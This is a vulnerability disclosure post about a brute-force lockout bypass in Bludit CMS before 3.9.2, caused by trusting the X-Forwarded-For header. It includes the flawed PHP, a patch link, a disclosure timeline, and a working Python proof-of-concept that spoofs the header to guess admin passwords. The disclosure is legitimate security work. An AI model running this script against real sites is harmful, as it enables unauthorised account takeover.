---
layout: post
title: Bludit Brute Force Mitigation Bypass
date: 2019-10-05
categories:
  - disclosure
  - websec
  - security
tags:
  - disclosure
  - php
  - security
  - websec
image: /assets/images/2019-10-05-bludit-brute-force-mitigation-bypass/68747470733a2f2f61736369696e656d612e6f72672f612f3237323636312e737667.jpg
---
Versions prior to 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to incorrectly login 10 times or more. Within the `bl-kernel/security.class.php` file, there is a function named `getUserIp` which attempts to determine the _true_ IP address of the end user by trusting the `X-Forwarded-For` and `Client-IP` HTTP headers:

```php
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}
```

The reasoning behind the checking of these headers is to determine the IP address of end users who are accessing the website behind a proxy, however, trusting these headers allows an attacker to easily spoof the source address. Additionally, no validation is carried out to ensure they are valid IP addresses, meaning that an attacker can use any arbitrary value and not risk being locked out.

As can be seen in the content of the log file below (found in `bl-content/databases/security.php`), submitting a login request with an `X-Forwarded-For` header value of `FakeIp` was processed successfully, and the failed login attempt was logged against the spoofed string:

```json
{
    "minutesBlocked": 5,
    "numberFailuresAllowed": 10,
    "blackList": {
        "192.168.194.1": {
            "lastFailure": 1570286876,
            "numberFailures": 1
        },
        "10.10.10.10": {
            "lastFailure": 1570286993,
            "numberFailures": 1
        },
        "FakeIp": {
            "lastFailure": 1570287052,
            "numberFailures": 1
        }
    }
}
```

By automating the generation of unique header values, prolonged brute force attacks can be carried out without risk of being blocked after 10 failed attempts, as can be seen in the demonstration video below in which a total of 51 attempts are made prior to recovering the correct password.

Demonstration
-------------
<script id="asciicast-272661" src="https://asciinema.org/a/272661.js" async></script>
<noscript><a href="https://asciinema.org/a/272661" target="\_blank"><img src="https://asciinema.org/a/272661.svg" /></a></noscript>

Versions Affected
-----------------
<= 3.9.2

Solution
--------
Apply the patch found at [https://github.com/bludit/bludit/pull/1090](https://github.com/bludit/bludit/pull/1090)

CVSS v3 Vector
--------------
[AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:W/RC:R](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:W/RC:R&version=3.1)

Disclosure Timeline
-------------------
- **2019-10-05**: Vulnerability found, pull request opened with fix
- **2019-10-05**: CVE requested

Proof of Concept
----------------
```python
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```
